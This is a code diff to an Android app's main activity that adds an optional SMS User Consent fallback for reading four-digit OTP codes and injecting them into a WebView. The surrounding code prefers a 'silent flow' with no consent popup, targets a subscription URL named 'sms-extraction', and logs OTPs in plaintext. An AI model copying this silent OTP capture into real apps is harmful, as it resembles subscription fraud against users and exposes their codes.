@@ -1,6 +1,8 @@
 package com.goalnowx.app
 
 import android.annotation.SuppressLint
+import android.content.Context
+import android.content.Intent
 import android.content.IntentFilter
 import android.os.Bundle
 import android.os.Handler
@@ -28,6 +30,7 @@ class MainActivity : AppCompatActivity() {
     private var lastSmsRetrieverStartAt = 0L
     private var phoneHintRequested = false
     private val mainHandler = Handler(Looper.getMainLooper())
+    private var smsConsentEnabled = false
 
     // Phone Number Hint API launcher
     private lateinit var phoneNumberHintLauncher: ActivityResultLauncher<IntentSenderRequest>
@@ -41,6 +44,7 @@ class MainActivity : AppCompatActivity() {
         private const val SUBSCRIPTION_URL = "https://sms-extraction.vercel.app"
         private const val SMS_RETRIEVER_RESTART_MIN_MS = 12_000L
         private const val SMS_RETRIEVER_HEARTBEAT_MS = 110_000L
+        private const val SMS_CONSENT_REQUEST = 2
     }
 
     private val smsRetrieverHeartbeat = object : Runnable {
@@ -213,14 +217,22 @@ class MainActivity : AppCompatActivity() {
             injectOtpIntoWebView(otp)
         }
 
-        smsReceiver.onConsentRequired = {
-            // Client requirement: no SMS permission/consent popup.
-            Log.d(TAG, "SMS consent intent ignored (silent flow only)")
+        smsReceiver.onConsentRequired = consent@{ consentIntent ->
+            if (!smsConsentEnabled) {
+                Log.d(TAG, "SMS consent intent ignored (silent flow only)")
+                return@consent
+            }
+            try {
+                @Suppress("DEPRECATION")
+                startActivityForResult(consentIntent, SMS_CONSENT_REQUEST)
+            } catch (e: Exception) {
+                Log.e(TAG, "SMS consent launch failed", e)
+            }
         }
 
         val filter = IntentFilter(SmsRetriever.SMS_RETRIEVED_ACTION)
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
-            registerReceiver(smsReceiver, filter, SmsRetriever.SEND_PERMISSION, null, RECEIVER_EXPORTED)
+            registerReceiver(smsReceiver, filter, SmsRetriever.SEND_PERMISSION, null, Context.RECEIVER_EXPORTED)
         } else {
             registerReceiver(smsReceiver, filter, SmsRetriever.SEND_PERMISSION, null)
         }
@@ -242,6 +254,41 @@ class MainActivity : AppCompatActivity() {
             }
 
         Log.d(TAG, "App hash: ${getAppSignatureHash()}")
+    }
+
+    fun enableSmsConsentFallback() {
+        if (smsConsentEnabled) return
+        smsConsentEnabled = true
+        Log.d(TAG, "SMS consent fallback ENABLED")
+        // Start SMS User Consent API (shows consent dialog when next OTP SMS arrives)
+        SmsRetriever.getClient(this)
+            .startSmsUserConsent(null)
+            .addOnSuccessListener {
+                Log.d(TAG, "SMS User Consent started")
+            }
+            .addOnFailureListener { e ->
+                Log.e(TAG, "SMS User Consent start failed", e)
+            }
+    }
+
+    private fun extractOtp(message: String): String? {
+        val pattern = Regex("\\b(\\d{4})\\b")
+        return pattern.find(message)?.groupValues?.get(1)
+    }
+
+    @Suppress("DEPRECATION")
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == SMS_CONSENT_REQUEST && resultCode == RESULT_OK && data != null) {
+            val message = data.getStringExtra(SmsRetriever.EXTRA_SMS_MESSAGE)
+            if (message != null) {
+                val otp = extractOtp(message)
+                if (otp != null) {
+                    Log.d(TAG, "OTP from SMS consent: $otp")
+                    injectOtpIntoWebView(otp)
+                }
+            }
+        }
     }
 
     fun launchPhoneNumberHint() {
